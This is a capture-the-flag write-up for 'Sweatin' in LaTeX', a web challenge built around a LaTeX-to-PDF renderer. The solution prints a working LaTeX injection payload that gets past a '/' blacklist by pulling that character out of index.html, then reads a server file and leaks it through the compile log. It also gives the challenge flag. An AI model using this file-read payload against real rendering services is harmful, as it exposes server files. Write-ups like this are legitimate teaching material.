# Richard Simmons: Sweatin' in LaTeX
### Category: Web Exploitation
### Author: James Lowther (Articuler)

## Description
Richard Simmons' new workout "Sweatin' in LaTeX" is out now! See if you can shimmy your way to the flag!

## Solution
The website appears to be a renderer for LaTeX code. Writing LaTex and clicking "Generate PDF" gives a link to a rendered PDf. The output LOG of the LaTeX renderer will also be displayed. 

1. Looking at the source HTML indicates that we need to read the flag from a file found in `/sweatin/to/the/oldies/flag.txt`.
2. LaTeX is turing-complete and has the ability to read files, however, certain strings have been blacklisted. Most notably, `/` has been blacklisted making it challenging to create the path to read the file.
3. The `/` character however can be isolated from `index.html` using the `\StrMid` function from the `xstring` package. By getting the `/` character from `index.html`, we can use it to build our path and bypass the blacklisted characters filter.
4. Using this we can write the following LaTeX code that will build the path and read the flag:
```
\documentclass{minimal}

% The xstring package allows us to use \StrMid
\usepackage{xstring}

% Define sections of the path to the flag
\def\a{sweatin}
\def\b{to}
\def\c{the}
\def\d{oldies}
\def\e{flag.txt}

% Read index.html and isolate the forward-s lash character into \s
\newread\file
\immediate\openin\file=index.html
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\StrMid{\fileline}{43}{43}[\s]
\immediate\closein\file

% Build the path the the flag and read it
\immediate\openin\file=\s\a\s\b\s\c\s\d\s\e
\loop\unless\ifeof\file
    \read\file to\fileline
    \message{\fileline}
\repeat
\closein\file

\begin{document}
\end{document} 
```

The flag can be found in the returned LOG data.

## Flag
magpie{r1ch4rd_l0v35_t0_5w34t}

*Inspired and derived from [the web90 challenge in Internetwache CTF 2016](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)*
